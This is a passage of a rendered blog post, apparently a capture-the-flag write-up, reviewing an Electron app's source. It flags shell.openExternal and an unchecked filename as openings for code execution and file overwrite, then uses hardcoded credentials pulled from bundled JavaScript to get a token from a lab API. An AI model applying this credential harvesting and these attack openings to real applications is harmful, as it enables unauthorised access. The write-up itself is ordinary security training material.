property-access\",children:\"pop\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"const\"}),\" filepath \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    fs\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"access\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"filepath\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" fs\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"F_OK\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"async\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"err\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"err\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"await\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"download\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token maybe-class-name\",children:\"BrowserWindow\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getFocusedWindow\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),\" \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"directory\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" downloadPath \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        win\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"webContents\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"send\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'file-downloaded'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"File Imported at: \"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      win\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"webContents\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"send\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'file-downloaded'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsxs)(n.span,{className:\"token template-string\",children:[(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"File Already Exists At: \"}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"downloadPath\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsxs)(n.span,{className:\"token interpolation\",children:[(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"${\"}),\"filename\",(0,e.jsx)(n.span,{className:\"token interpolation-punctuation punctuation\",children:\"}\"})]}),(0,e.jsx)(n.span,{className:\"token template-punctuation string\",children:\"`\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"else\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    shell\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"openExternal\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"url\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"The code listens for an \",(0,e.jsx)(n.code,{children:\"handle-links\"}),\" event on the \",(0,e.jsx)(n.code,{children:\"ipcMain\"}),` module, which is used to communicate between the main process and renderer processes in Electron.\nWhen the `,(0,e.jsx)(n.code,{children:\"handle-links\"}),\" event is received, the code checks the value of the \",(0,e.jsx)(n.code,{children:\"task\"}),\" argument to determine the desired action. If the \",(0,e.jsx)(n.code,{children:\"task\"}),\" argument is \",(0,e.jsx)(n.code,{children:\"download\"}),\", the code extracts the filename from the \",(0,e.jsx)(n.code,{children:\"url\"}),\". And here comes the interesting part, where urls are passed to the \",(0,e.jsx)(n.code,{children:\"shell.openExternal\"}),\" function which allows this application to open a URL in the web browser. Researching about this function we see that it can allow us to execute arbitrary code on the user\\u2019s system. Another possibility is that if we have control over the \",(0,e.jsx)(n.code,{children:\"filename\"}),\" variable, we will eventually have file overwrite while traversing the directory.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We\\u2019ll get back to this later, once we understand how this application works.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"In the \",(0,e.jsx)(n.code,{children:\"src/js\"}),\" folder, we have \",(0,e.jsx)(n.code,{children:\"app.js\"}),\" which seems to be packed. Without cleaning it, we can notice that\\u2019s it talking with an API where it takes the URL from \",(0,e.jsx)(n.code,{children:\"config.json\"}),\" which seems missing from the source.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsx)(n.code,{className:\"language-js code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"/* harmony import */\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"var\"}),\" _config_json__WEBPACK_IMPORTED_MODULE_1__ \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"__webpack_require__\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"/*! ./config.json */\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'./src/js/config.json'\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Since we knew/assumed that we have an API running on port 9000, \",(0,e.jsx)(n.code,{children:\"BACKEND_URL\"}),\" should be \",(0,e.jsx)(n.code,{children:\"http://10.129.228.64:9000\"}),\". Reading much further, we can see an API call to \",(0,e.jsx)(n.code,{children:\"/api/login\"}),\" where we find credentials for the \",(0,e.jsx)(n.code,{children:\"developer\"}),\" user.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"''\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/api/login'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'POST'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token string-property property\",children:\"'Content-Type'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'application/json'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"body\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token known-class-name class-name\",children:\"JSON\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"stringify\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'developer'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"password\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'5up3rd3vl0per!!'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"res\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" res\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"json\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"data\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"status\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"===\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"200\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"setItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"setItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'username'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token property-access\",children:\"username\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token function\",children:\"setLoading\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"false\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried using the API that we have to confirm that it\\u2019s talking with it. And it works!\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token response-status\",children:[(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"}),\" \",(0,e.jsx)(n.span,{className:\"token status-code number\",children:\"200\"}),\" \",(0,e.jsx)(n.span,{className:\"token reason-phrase string\",children:\"OK\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json; charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"207\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Date\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"Sat, 03 Dec 2022 09:15:30 GMT\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImRldmVsb3BlciIsImlhdCI6MTY3MDA1ODkzMCwiZXhwIjoxNjcwMDgwNTMwfQ.TCk_Ixejig808W5BainV05u5hmFlE65U0knzjvSIdwI\",\"status\":200,\"username\":\"developer\"}\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can see multiple endpoints including \",(0,e.jsx)(n.code,{children:\"/api/chats/allChats\"})]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-js\",children:(0,e.jsxs)(n.code,{className:\"language-js code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token function\",children:\"fetch\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:'\"\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"concat\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"_config_json__WEBPACK_IMPORTED_MODULE_1__\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token constant\",children:\"BACKEND_URL\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/api/chats/allChats\"'}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"method\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'GET'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"headers\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"                \",(0,e.jsx)(n.span,{className:\"token literal-property property\",children:\"token\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token dom variable\",children:\"localStorage\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"getItem\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'token'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"data\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token keyword control-flow\",children:\"return\"}),\" data\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"json\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token method function property-access\",children:\"then\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token parameter\",children:\"chats\"}),\" \",(0,e.jsx)(n.span,{className:\"token arrow operator\",children:\"=\u003e\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"              \",(0,e.jsx)(n.span,{className:\"token function\",children:\"setallMessages\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"chats\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"            \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"          \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"I tried fetching it using the token I retrieved from the login.\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token response-status\",children:[(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"}),\" \",(0,e.jsx)(n.span,{className:\"token status-code number\",children:\"200\"}),\" \",(0,e.jsx)(n.span,{className:\"token reason-phrase string\",children:\"OK\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token 